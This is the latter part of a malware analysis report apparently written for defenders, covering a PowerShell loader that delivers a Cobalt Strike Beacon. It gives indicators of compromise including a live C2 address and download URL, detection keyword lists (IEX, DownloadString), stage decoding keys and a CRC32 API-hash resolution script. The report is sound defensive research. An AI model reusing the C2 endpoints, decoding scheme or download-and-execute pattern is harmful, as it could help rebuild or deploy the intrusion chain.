Stage 2 contains a complete implementation of the SHA-256 algorithm:

* standard constants;
* context initialization;
* block processing;
* finalization;
* known test vectors.

The presence of this implementation does not, by itself, prove that it is responsible for C2 channel encryption or configuration decoding.

---

## 16. Persistence

No strong static indicators of automatic persistence through `Run / RunOnce`, `Scheduled Tasks`, `WMI, Startup Folder`, `COM Hijacking`, or `DLL Search Order Hijacking` were found.

Service functionality may be triggered through tasking, but its presence in the binary does not demonstrate that a service is created during the initial infection.

Conclusion:

> **Automatic persistence was not confirmed within the scope of this analysis.**

---

## 17. Anti-Analysis Techniques

| Technique                         | Evidence                                      | Assessment                    |
| --------------------------------- | -------------------------------------------- | ------------------------------- |
| Base64 payload                    | String in PowerShell                           | Confirmed                     |
| In-memory execution               | File mapping and delegate                      | Confirmed                     |
| Stage 1 ROR decoder               | Loop in the shellcode                          | Confirmed                     |
| Stage 2 ROR decoder               | Loop in the intermediate DLL                   | Confirmed                     |
| API hashing                       | CRC32 over exports                             | Confirmed                     |
| Obfuscated configuration          | XOR `0x2E`                                     | Confirmed                     |
| Reflective loading                | `_ReflectiveLoader@4`                          | Confirmed                     |
| Parent-process termination        | Toolhelp, `OpenProcess`, and `TerminateProcess` | Confirmed                     |


APIs such as `IsDebuggerPresent`, `DebugBreak`, `RaiseException`, and `SetUnhandledExceptionFilter` appear in Stage 2, but their uses are compatible with MSVC runtime components. They should not automatically be classified as custom anti-debugging mechanisms.

---

## 18. Indicators of Compromise

### 18.1 Infrastructure

| Type        | Value                                |
| ----------- | ------------------------------------ |
| IP          | `31.41.244.192`                      |
| Port        | `80`                                 |
| Initial URL | `http://31.41.244.192:80/645gkdkfgd` |
| GET URI     | `/push`                              |
| POST URI    | `/submit.php`                        |

### 18.2 User-Agent

```text
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
```

### 18.3 Artifacts

| Artifact        | Hash                                                               |
| --------------- | ------------------------------------------------------------------ |
| Stage 1 SHA-256 | `a41dde7d2733cf4f8c057a188fb5bce82f085b7972aeaa23b5ddb0ef71c1988d` |
| Stage 2 SHA-256 | `6318e322c478adefa9b4a16166c3d05201153b5cbd1f2e21327300abdeb5a757` |

### 18.4 Other Indicators

```text
9K8J7HG65F467j
a32big.dll
beacon.dll
_ReflectiveLoader@4
%windir%\syswow64\rundll32.exe
%windir%\sysnative\rundll32.exe
```

---

## 19. Detection Opportunities

### 19.1 PowerShell

Monitor command lines containing combinations such as:

```text
powershell.exe
-nop
-w hidden
IEX
Net.WebClient
DownloadString
```

### 19.2 Memory

Monitor PowerShell processes that:

* resolve `CryptStringToBinaryA`;
* create executable file mappings;
* map regions with write and execute permissions;
* convert pointers into delegates;
* transfer execution to private memory.

### 19.3 Network

Monitor:

```text
31.41.244.192:80
GET /push
POST /submit.php
```

The old and unusual User-Agent may also be used as a supplementary indicator.

### 19.4 Behavior

Correlate:

```text
PowerShell
→ DownloadString
→ in-memory execution
→ executable file mapping
→ parent-process termination
→ reflective loading
→ WinINet communication
```

---

## 20. Conclusion

The analyzed chain uses PowerShell as the initial download and in-memory execution mechanism.

The loader avoids explicit P/Invoke declarations through .NET reflection, processes a Base64 payload with `CryptStringToBinaryA`, and writes the resulting shellcode to an executable memory region.

The initial shellcode recovers an x86 DLL through a bit-rotation-based decoder. This DLL acts as an intermediate loader, resolves APIs through CRC32, implements process-tree control mechanisms, and extracts a second embedded PE file.

The second stage was identified as an x86 Cobalt Strike Beacon. Its configuration was recovered through XOR `0x2E` and revealed HTTP communication with:

```text
31.41.244.192:80
GET /push
POST /submit.php
```

The Beacon implements capabilities for:

* remote execution;
* process injection;
* token manipulation;
* PowerShell execution;
* service operations;
* HTTP C2 communication.

The analysis did not confirm automatic persistence or the actual execution of every capability present. These functions should be interpreted as resources available to the operator after communication with the C2 server is established.

---

## Appendix A — Produced Files

```text
loader.ps1
stage0_shellcode.bin
stage1_decoded.bin
stage2_decoded.bin
config_decoded.bin
```

---

## Appendix B — Algorithm Summary

```text
Stage 0:
CryptStringToBinaryA / base64

Stage 1:
ROR8 per byte
Count = incremental key & 7

Stage 2:
ROR8 per byte
Count = (1 + index) & 7
Decoding into a new RWX region
Execution through the base address of the recovered region

Configuration:
XOR each byte with 0x2E

API hashing:
Reflected CRC32
Polynomial 0xEDB88320
Seed 0xFFFFFFFF
No final XOR observed
```

---

## Appendix C — Summarized Flow

```text
powershell.exe
    |
    | DownloadString + IEX
    v
loader.ps1
    |
    | CryptStringToBinaryA
    v
stage0_shellcode.bin
    |
    | ROR decoder
    v
stage1_decoded.bin
    |
    | API hashing / process control / ROR
    v
stage2_decoded.bin
    |
    | ReflectiveLoader / XOR config
    v
Cobalt Strike Beacon
    |
    | HTTP
    v
31.41.244.192:80
```

---

## Appendix D — Complete API Hash Mapping
{: #appendix-d }

[↩ Back to reference](#ref-appendix-d){: .appendix-backlink role="doc-backlink" }

### `kernel32.dll`

| Hash CRC32   | API resolvida                           |
| ------------ | --------------------------------------- |
| `0x007F73EF` | `CreateRemoteThread`                    |
| `0x0394BD0E` | `GetModuleFileNameW`                    |
| `0x05C2D077` | `FlushFileBuffers`                      |
| `0x06EE1D63` | `HeapDestroy`                           |
| `0x083851BD` | `ReadProcessMemory`                     |
| `0x0AB29637` | `CopyFileW`                             |
| `0x0AE688F8` | `Thread32Next`                          |
| `0x0B635934` | `PeekNamedPipe`                         |
| `0x1038158B` | `SetFilePointer`                        |
| `0x1704C494` | `FreeEnvironmentStringsA`               |
| `0x17A15D18` | `WriteConsoleW`                         |
| `0x17F91E53` | `LeaveCriticalSection`                  |
| `0x19D17DB2` | `VirtualAllocEx`                        |
| `0x1C812D1E` | `InitializeCriticalSectionAndSpinCount` |
| `0x1DE0986E` | `DuplicateHandle`                       |
| `0x1FA744BA` | `WaitForSingleObject`                   |
| `0x20200D0B` | `OutputDebugStringW`                    |
| `0x207889B5` | `GetVersionExA`                         |
| `0x20D8AEB4` | `OpenProcess`                           |
| `0x21600F2E` | `MoveFileA`                             |
| `0x22041FCB` | `SetLastError`                          |
| `0x231ACDD9` | `GetFileType`                           |
| `0x24279339` | `CompareStringA`                        |
| `0x25227614` | `GetStdHandle`                          |
| `0x2582BE79` | `SetEnvironmentVariableW`               |
| `0x2597DC70` | `FreeLibrary`                           |
| `0x264DFB6B` | `GetCommandLineW`                       |
| `0x27D40965` | `FindClose`                             |
| `0x27FA4E5D` | `ReadConsoleA`                          |
| `0x288801BB` | `GetACP`                                |
| `0x296DC854` | `GetFullPathNameW`                      |
| `0x2A3CA097` | `SetStdHandle`                          |
| `0x2D1AC948` | `GetLastError`                          |
| `0x2DC506A1` | `DecodePointer`                         |
| `0x2E1B9C17` | `TlsGetValue`                           |
| `0x2F79E55B` | `GetCurrentProcess`                     |
| `0x310D1257` | `Sleep`                                 |
| `0x32AA51AB` | `GetConsoleCP`                          |
| `0x32AC0A22` | `VirtualFree`                           |
| `0x3316A9ED` | `WriteFile`                             |
| `0x347BE5AB` | `SetUnhandledExceptionFilter`           |
| `0x34EAF723` | `LoadLibraryW`                          |
| `0x35F56674` | `AreFileApisANSI`                       |
| `0x36142A31` | `FindFirstFileA`                        |
| `0x3683E000` | `GetProcAddress`                        |
| `0x38623B1C` | `GetCurrentDirectoryA`                  |
| `0x38CE4F40` | `RemoveDirectoryW`                      |
| `0x3B4B56B2` | `GetFileAttributesW`                    |
| `0x3E0C4789` | `CreateToolhelp32Snapshot`              |
| `0x3E19300A` | `GetEnvironmentStringsW`                |
| `0x43949840` | `Process32NextW`                        |
| `0x43F291E1` | `IsProcessorFeaturePresent`             |
| `0x4505FC28` | `SetHandleCount`                        |
| `0x457C3B09` | `GetComputerNameA`                      |
| `0x47AB7900` | `OpenThread`                            |
| `0x49C0EE61` | `WaitNamedPipeW`                        |
| `0x4BE46D93` | `CreateFileMappingA`                    |
| `0x4DF59A83` | `GetModuleHandleExA`                    |
| `0x4E799A8F` | `GetModuleHandleA`                      |
| `0x4E7D2056` | `HeapCreate`                            |
| `0x4EACF3C1` | `GetOEMCP`                              |
| `0x4F091756` | `HeapFree`                              |
| `0x4F6CEA0B` | `CloseHandle`                           |
| `0x5199F0B9` | `UpdateProcThreadAttribute`             |
| `0x521D346A` | `GetStartupInfoA`                       |
| `0x52A94FBD` | `QueryPerformanceCounter`               |
| `0x54BF4072` | `TerminateProcess`                      |
| `0x5764C7D0` | `MapViewOfFile`                         |
| `0x57AE26E9` | `CreateProcessA`                        |
| `0x59454763` | `ExpandEnvironmentStringsA`             |
| `0x5C79E9FF` | `LCMapStringA`                          |
| `0x5CA76EFC` | `DeleteCriticalSection`                 |
| `0x5DEA8D31` | `CreatePipe`                            |
| `0x5E1016D6` | `CreateFileW`                           |
| `0x629DCE31` | `SetCurrentDirectoryW`                  |
| `0x64EFD1D2` | `LoadLibraryExA`                        |
| `0x657F1A76` | `WideCharToMultiByte`                   |
| `0x667AF71D` | `SetFilePointerEx`                      |
| `0x69D3CE38` | `GetStringTypeA`                        |
| `0x6ADB82C6` | `CreateNamedPipeW`                      |
| `0x6E649434` | `DeleteFileA`                           |
| `0x6F95F94F` | `CreateThread`                          |
| `0x6FFCBEB5` | `GetConsoleOutputCP`                    |
| `0x71139260` | `GetSystemTimeAsFileTime`               |
| `0x7207819C` | `GetCurrentThreadId`                    |
| `0x7AB4C783` | `GetLocaleInfoW`                        |
| `0x7BC9086A` | `IsDebuggerPresent`                     |
| `0x7C6586FA` | `SetErrorMode`                          |
| `0x7D65BB85` | `ConnectNamedPipe`                      |
| `0x7E0C63E6` | `FindNextFileW`                         |
| `0x7E68FFB3` | `Process32FirstW`                       |
| `0x7EB24952` | `CreateDirectoryA`                      |
| `0x7EFDC07A` | `ProcessIdToSessionId`                  |
| `0x7F509D1E` | `ExitThread`                            |
| `0x81C17B2A` | `EncodePointer`                         |
| `0x84221D18` | `Wow64SetThreadContext`                 |
| `0x8A66FC03` | `CreateDirectoryW`                      |
| `0x8AD8D6B7` | `FindNextFileA`                         |
| `0x8D0EE1C6` | `MultiByteToWideChar`                   |
| `0x8E6072D2` | `GetLocaleInfoA`                        |
| `0x8EE3D934` | `GetLogicalDrives`                      |
| `0x903B6483` | `LoadLibraryExW`                        |
| `0x96497B60` | `SetCurrentDirectoryA`                  |
| `0x976BF8A9` | `FileTimeToSystemTime`                  |
| `0x985383D9` | `SystemTimeToTzSpecificLocalTime`       |
| `0x9AB02165` | `DeleteFileW`                           |
| `0x9B61463E` | `GetThreadContext`                      |
| `0x9D077B69` | `GetStringTypeW`                        |
| `0x9E0F3797` | `CreateNamedPipeA`                      |
| `0xA124E28D` | `HeapAlloc`                             |
| `0xA23ED800` | `GetConsoleMode`                        |
| `0xA2E7FBEC` | `VirtualProtectEx`                      |
| `0xA37A93B8` | `CreateProcessW`                        |
| `0xA4BDE607` | `GetTickCount`                          |
| `0xA6BDEBA2` | `SetNamedPipeHandleState`               |
| `0xA6C9813B` | `GetStartupInfoW`                       |
| `0xA7765701` | `HeapReAlloc`                           |
| `0xA8AD5CAE` | `LCMapStringW`                          |
| `0xA9773427` | `SetThreadContext`                      |
| `0xAAC4A387` | `CreateFileA`                           |
| `0xAD91F232` | `ExpandEnvironmentStringsW`             |
| `0xAF201BD3` | `DebugBreak`                            |
| `0xB0A768D1` | `WriteProcessMemory`                    |
| `0xB1A88E58` | `GetComputerNameW`                      |
| `0xB61FD3CB` | `VirtualQuery`                          |
| `0xB6346F01` | `Wow64GetThreadContext`                 |
| `0xB81509F1` | `TlsFree`                               |
| `0xB9212FD2` | `GetModuleHandleExW`                    |
| `0xBAAD2FDE` | `GetModuleHandleW`                      |
| `0xBD0B6607` | `DeleteProcThreadAttributeList`         |
| `0xBD145B30` | `WaitNamedPipeA`                        |
| `0xBF09BD92` | `GetProcessHeap`                        |
| `0xBF30D8C2` | `CreateFileMappingW`                    |
| `0xC03E4272` | `LoadLibraryA`                          |
| `0xC2C09F60` | `FindFirstFileW`                        |
| `0xC6E54950` | `UnmapViewOfFile`                       |
| `0xC78D4146` | `ResumeThread`                          |
| `0xCACD855B` | `GetEnvironmentStringsA`                |
| `0xCC1AFA11` | `RemoveDirectoryA`                      |
| `0xCCB68E4D` | `GetCurrentDirectoryW`                  |
| `0xCF9FE3E3` | `GetFileAttributesA`                    |
| `0xD06FE642` | `DisconnectNamedPipe`                   |
| `0xD0F32668` | `CompareStringW`                        |
| `0xD0FE5166` | `EnterCriticalSection`                  |
| `0xD1560B28` | `SetEnvironmentVariableA`               |
| `0xD1AFCBF4` | `IsWow64Process`                        |
| `0xD2994E3A` | `GetCommandLineA`                       |
| `0xD32EFB0C` | `ReadConsoleW`                          |
| `0xD4AC3CE4` | `GetVersionExW`                         |
| `0xD4F4B85A` | `OutputDebugStringA`                    |
| `0xD5B4BA7F` | `MoveFileW`                             |
| `0xD6EAA3C6` | `TlsSetValue`                           |
| `0xD8092904` | `GetCPInfo`                             |
| `0xD9830E5A` | `Process32First`                        |
| `0xD9A3A95F` | `InitializeProcThreadAttributeList`     |
| `0xDAE64EA5` | `SetEndOfFile`                          |
| `0xDAEF6833` | `ExitProcess`                           |
| `0xDC74CEEB` | `Thread32First`                         |
| `0xDDB97D05` | `GetFullPathNameA`                      |
| `0xE24BEC1C` | `GetCurrentProcessId`                   |
| `0xE375E849` | `WriteConsoleA`                         |
| `0xE3A7BFC3` | `IsValidCodePage`                       |
| `0xE3D071C5` | `FreeEnvironmentStringsW`               |
| `0xE44BC2DF` | `GetLocalTime`                          |
| `0xE619A249` | `GetCurrentThread`                      |
| `0xE961C8D8` | `TlsAlloc`                              |
| `0xECAC0FD0` | `UnhandledExceptionFilter`              |
| `0xEFF990D0` | `VirtualProtect`                        |
| `0xF5E7F2F4` | `HeapSize`                              |
| `0xF631F2B5` | `VirtualAlloc`                          |
| `0xF6A3FC2F` | `ReadFile`                              |
| `0xF740085F` | `GetModuleFileNameA`                    |
| `0xFD712A3F` | `Process32Next`                         |
| `0xFE662366` | `CopyFileA`                             |

### `ws2_32.dll`

| Hash CRC32   | API resolvida     |
| ------------ | ----------------- |
| `0x053BE917` | `htons`           |
| `0x2AC874D1` | `ioctlsocket`     |
| `0x34EB427D` | `WSASocketA`      |
| `0x3DDB9802` | `listen`          |
| `0x4CDF12CB` | `accept`          |
| `0x5129B6C4` | `ntohl`           |
| `0x588CC532` | `send`            |
| `0x5A392888` | `closesocket`     |
| `0x5F0A036C` | `WSAStartup`      |
| `0x6067C93F` | `WSAIoctl`        |
| `0x6A5D213D` | `shutdown`        |
| `0x6AC070A3` | `__WSAFDIsSet`    |
| `0x71CC6743` | `WSACleanup`      |
| `0x8833E4E2` | `htonl`           |
| `0x8B3006E0` | `connect`         |
| `0xA627AD52` | `recv`            |
| `0xAFF54180` | `WSAGetLastError` |
| `0xB40D153F` | `select`          |
| `0xB9330CAC` | `bind`            |
| `0xC03FF72C` | `WSASocketW`      |
| `0xC88ABA5D` | `gethostbyname`   |
| `0xDC21BB31` | `ntohs`           |
| `0xFA1A9744` | `socket`          |

### `wininet.dll`

| Hash CRC32   | API resolvida                |
| ------------ | ---------------------------- |
| `0x00FF4E09` | `HttpSendRequestA`           |
| `0x099E7708` | `HttpQueryInfoW`             |
| `0x14786735` | `InternetErrorDlg`           |
| `0x1AE6E2DB` | `InternetCloseHandle`        |
| `0x1D68C08E` | `HttpAddRequestHeadersW`     |
| `0x25E957C2` | `InternetOpenA`              |
| `0x3AB06AA7` | `InternetQueryOptionA`       |
| `0x3DB05A0B` | `InternetConnectA`           |
| `0x4171F640` | `InternetSetOptionW`         |
| `0x4515EC5F` | `InternetSetStatusCallbackA` |
| `0x4F5642C5` | `HttpOpenRequestW`           |
| `0x933F670A` | `InternetReadFile`           |
| `0xB1C1590E` | `InternetSetStatusCallbackW` |
| `0xB5A54311` | `InternetSetOptionA`         |
| `0xBB82F794` | `HttpOpenRequestA`           |
| `0xC964EF5A` | `InternetConnectW`           |
| `0xCE64DFF6` | `InternetQueryOptionW`       |
| `0xD13DE293` | `InternetOpenW`              |
| `0xE5068E1B` | `InternetQueryDataAvailable` |
| `0xE9BC75DF` | `HttpAddRequestHeadersA`     |
| `0xF42BFB58` | `HttpSendRequestW`           |
| `0xFD4AC259` | `HttpQueryInfoA`             |

### `advapi32.dll`

| Hash CRC32   | API resolvida     |
| ------------ | ----------------- |
| `0x267823E2` | `CreateServiceA`   |
| `0x3995935B` | `QueryServiceStatus` |
| `0x793811AD` | `OpenSCManagerA`   |
| `0x7E4B6E4A` | `StartServiceW`    |
| `0x8A9FDB1B` | `StartServiceA`    |
| `0x8DECA4FC` | `OpenSCManagerW`   |
| `0x8F8A3020` | `CloseServiceHandle` |
| `0xD2AC96B3` | `CreateServiceW`   |
| `0xD646D2A5` | `DeleteService`    |


---

## Appendix E — Complete Hash Resolution Script

```python
from pathlib import Path
from collections import defaultdict
import pefile

kernel32_hashes = [
    0x35F56674, 0x4F6CEA0B, 0x24279339, 0xD0F32668, 0x7D65BB85, 0xFE662366, 0xAB29637, 0x7EB24952, 0x8A66FC03, 0xAAC4A387, 0x5E1016D6, 0x4BE46D93, 0xBF30D8C2, 0x9E0F3797, 0x6ADB82C6, 0x5DEA8D31, 0x57AE26E9, 0xA37A93B8, 0x7F73EF, 0x6F95F94F, 0x3E0C4789, 0xAF201BD3, 0x2DC506A1, 0x5CA76EFC, 0x6E649434, 0x9AB02165, 0xBD0B6607, 0xD06FE642, 0x1DE0986E, 0x81C17B2A, 0xD0FE5166, 0xDAEF6833, 0x7F509D1E, 0x59454763, 0xAD91F232, 0x976BF8A9, 0x27D40965, 0x36142A31, 0xC2C09F60, 0x8AD8D6B7, 0x7E0C63E6, 0x5C2D077, 0x1704C494, 0xE3D071C5, 0x2597DC70, 0x288801BB, 0xD8092904, 0xD2994E3A, 0x264DFB6B, 0x457C3B09, 0xB1A88E58, 0x32AA51AB, 0xA23ED800, 0x6FFCBEB5, 0x38623B1C, 0xCCB68E4D, 0x2F79E55B, 0xE24BEC1C, 0xE619A249, 0x7207819C, 0xCACD855B, 0x3E19300A, 0xCF9FE3E3, 0x3B4B56B2, 0x231ACDD9, 0xDDB97D05, 0x296DC854, 0x2D1AC948, 0xE44BC2DF, 0x8E6072D2, 0x7AB4C783, 0x8EE3D934, 0xF740085F, 0x394BD0E, 0x4E799A8F, 0xBAAD2FDE, 0x4DF59A83, 0xB9212FD2, 0x4EACF3C1, 0x3683E000, 0xBF09BD92, 0x521D346A, 0xA6C9813B, 0x25227614, 0x69D3CE38, 0x9D077B69, 0x71139260, 0x9B61463E, 0xA4BDE607, 0x207889B5, 0xD4AC3CE4, 0xA124E28D, 0x4E7D2056, 0x6EE1D63, 0x4F091756, 0xA7765701, 0xF5E7F2F4, 0x1C812D1E, 0xD9A3A95F, 0x7BC9086A, 0x43F291E1, 0xE3A7BFC3, 0xD1AFCBF4, 0x5C79E9FF, 0xA8AD5CAE, 0x17F91E53, 0xC03E4272, 0x34EAF723, 0x64EFD1D2, 0x903B6483, 0x5764C7D0, 0x21600F2E, 0xD5B4BA7F, 0x8D0EE1C6, 0x20D8AEB4, 0x47AB7900, 0xD4F4B85A, 0x20200D0B, 0xB635934, 0xD9830E5A, 0xFD712A3F, 0x7E68FFB3, 0x43949840, 0x7EFDC07A, 0x52A94FBD, 0x27FA4E5D, 0xD32EFB0C, 0xF6A3FC2F, 0x83851BD, 0xCC1AFA11, 0x38CE4F40, 0xC78D4146, 0x96497B60, 0x629DCE31, 0xDAE64EA5, 0xD1560B28, 0x2582BE79, 0x7C6586FA, 0x1038158B, 0x667AF71D, 0x4505FC28, 0x22041FCB, 0xA6BDEBA2, 0x2A3CA097, 0xA9773427, 0x347BE5AB, 0x310D1257, 0x985383D9, 0x54BF4072, 0xDC74CEEB, 0xAE688F8, 0xE961C8D8, 0xB81509F1, 0x2E1B9C17, 0xD6EAA3C6, 0xECAC0FD0, 0xC6E54950, 0x5199F0B9, 0xF631F2B5, 0x19D17DB2, 0x32AC0A22, 0xEFF990D0, 0xA2E7FBEC, 0xB61FD3CB, 0x1FA744BA, 0xBD145B30, 0x49C0EE61, 0x657F1A76, 0xB6346F01, 0x84221D18, 0xE375E849, 0x17A15D18, 0x3316A9ED, 0xB0A768D1
]
 
ws2_32_hashes = [
    0x71CC6743, 0xAFF54180, 0x6067C93F, 0x34EB427D, 0xC03FF72C, 0x5F0A036C, 0x6AC070A3, 0x4CDF12CB, 0xB9330CAC, 0x5A392888, 0x8B3006E0, 0xC88ABA5D, 0x8833E4E2, 0x53BE917, 0x2AC874D1, 0x3DDB9802, 0x5129B6C4, 0xDC21BB31, 0xA627AD52, 0xB40D153F, 0x588CC532, 0x6A5D213D, 0xFA1A9744
]
 
wininet_hashes = [
    0xE9BC75DF, 0x1D68C08E, 0xBB82F794, 0x4F5642C5, 0xFD4AC259, 0x99E7708, 0xFF4E09, 0xF42BFB58, 0x1AE6E2DB, 0x3DB05A0B, 0xC964EF5A, 0x25E957C2, 0xD13DE293, 0xE5068E1B, 0x3AB06AA7, 0xCE64DFF6, 0x933F670A, 0xB5A54311, 0x4171F640, 0x4515EC5F, 0xB1C1590E, 0x14786735
]

advapi32_hashes = [
    0x8F8A3020, 0x267823E2, 0xD2AC96B3, 0xD646D2A5, 0x793811AD, 0x8DECA4FC, 0x3995935B, 0x8A9FDB1B, 0x7E4B6E4A
]

def malware_crc32_name(name: bytes) -> int:
    crc = 0xFFFFFFFF

    for byte in name:
        crc ^= byte

        for _ in range(8):
            if crc & 1:
                crc = (
                    (crc >> 1) ^
                    0xEDB88320
                )
            else:
                crc >>= 1

            crc &= 0xFFFFFFFF

    return crc


def build_export_hash_index(
    dll_path: Path
):
    pe = pefile.PE(str(dll_path))
    index = defaultdict(list)

    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if not export.name:
            continue

        export_name = export.name.decode(
            "ascii",
            errors="replace"
        )

        export_hash = malware_crc32_name(
            export.name
        )

        index[export_hash].append(
            export_name
        )

    return index


def resolve_hashes(
    dll_name: str,
    dll_path: Path,
    hashes: list[int]
):
    export_index = build_export_hash_index(
        dll_path
    )

    results = []

    for target_hash in hashes:
        matches = export_index.get(
            target_hash & 0xFFFFFFFF,
            []
        )
        if matches:
            for api_name in matches:
                results.append({
                    "dll": dll_name,
                    "hash": (
                        target_hash &
                        0xFFFFFFFF
                    ),
                    "api": api_name,
                })
        else:
            results.append({
                "dll": dll_name,
                "hash": (
                    target_hash &
                    0xFFFFFFFF
                ),
                "api": "UNRESOLVED",
            })

    return results


all_results = []

"""
If you are on Linux, you can get the respective DLLs at
https://winbindex.m417z.com/?file=<DLL_Name>.dll 
and change the paths below to run this script 
"""

jobs = {
    "kernel32.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\kernel32.dll"
        ),
        "hashes": kernel32_hashes,
    },
    "ws2_32.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\ws2_32.dll"
        ),
        "hashes": ws2_32_hashes,
    },
    "wininet.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\wininet.dll"
        ),
        "hashes": wininet_hashes,
    },
    "advapi32.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\advapi32.dll"
        ),
        "hashes": advapi32_hashes,
    },
}

for dll_name, job in jobs.items():
    results = resolve_hashes(
        dll_name,
        job["path"],
        job["hashes"]
    )

    all_results.extend(results)

    print(f"\n--- {dll_name} ---")

    for result in results:
        print(
            f"0x{result['hash']:08X}"
            f" -> {result['api']}"
        )

```

## Learn more

1) **DFIR Report (2023)**: <a href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/#:~:text=http://31.41.244.192:80/645gkdkfgd'" target="_blank" rel="noopener noreferrer">From ScreenConnect to Hive Ransomware in 61 hours</a>

2) **eSentire Threat Intelligence Malware Analysis (2023):** <a href="https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign#:~:text=what%20about%20the%20PowerShell" target="_blank" rel="noopener noreferrer">Resident Campaign</a>

